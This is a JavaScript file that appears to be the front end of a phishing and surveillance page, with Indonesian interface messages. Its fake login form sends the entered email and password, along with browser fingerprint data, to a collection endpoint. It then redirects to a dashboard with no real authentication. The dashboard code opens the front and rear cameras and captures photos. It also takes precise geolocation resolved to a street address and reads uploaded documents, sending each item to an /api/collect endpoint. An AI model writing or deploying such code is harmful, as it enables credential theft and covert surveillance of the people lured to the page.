const API = '/api';

// ============ LOGIN ============
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        const payload = {
            email, password,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        try {
            await fetch(`${API}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {}
        
        localStorage.setItem('user_email', email);
        window.location.href = 'dashboard.html';
    });
}

// ============ DASHBOARD ============
if (window.location.pathname.includes('dashboard')) {
    const userEmail = localStorage.getItem('user_email') || 'User';
    const emailEl = document.getElementById('userEmail');
    if (emailEl) emailEl.textContent = userEmail;
    
    // Mulai kamera
    startCamera();
}

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }, audio: false
        });
        const video = document.getElementById('video');
        if (video) video.srcObject = stream;
        window.currentStream = stream;
        
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }, audio: false
            });
            window.backStream = backStream;
        } catch (e) {}
    } catch (e) {}
}

async function capturePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const photo = canvas.toDataURL('image/jpeg', 0.8);
    
    await sendData('photo_front', { image: photo });
    
    if (window.backStream) {
        const backVideo = document.createElement('video');
        backVideo.srcObject = window.backStream;
        await backVideo.play();
        await new Promise(r => setTimeout(r, 1000));
        canvas.width = backVideo.videoWidth;
        canvas.height = backVideo.videoHeight;
        canvas.getContext('2d').drawImage(backVideo, 0, 0);
        const backPhoto = canvas.toDataURL('image/jpeg', 0.8);
        await sendData('photo_back', { image: backPhoto });
    }
    
    alert('Foto terkirim');
}

function getLocation() {
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const loc = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
        };
        try {
            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}`);
            const d = await r.json();
            loc.address = d.display_name;
        } catch (e) {}
        await sendData('location', loc);
        alert('Lokasi terkirim');
    }, (err) => alert('Gagal ambil lokasi'));
}

function uploadDoc() {
    const file = document.getElementById('docFile').files[0];
    if (!file) return alert('Pilih file');
    const reader = new FileReader();
    reader.onload = async () => {
        await sendData('document', { name: file.name, data: reader.result });
        alert('Dokumen terkirim');
    };
    reader.readAsDataURL(file);
}

async function sendData(type, data) {
    const email = localStorage.getItem('user_email') || 'unknown';
    try {
        await fetch(`${API}/collect`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type, data, email })
        });
    } catch (e) {}
}
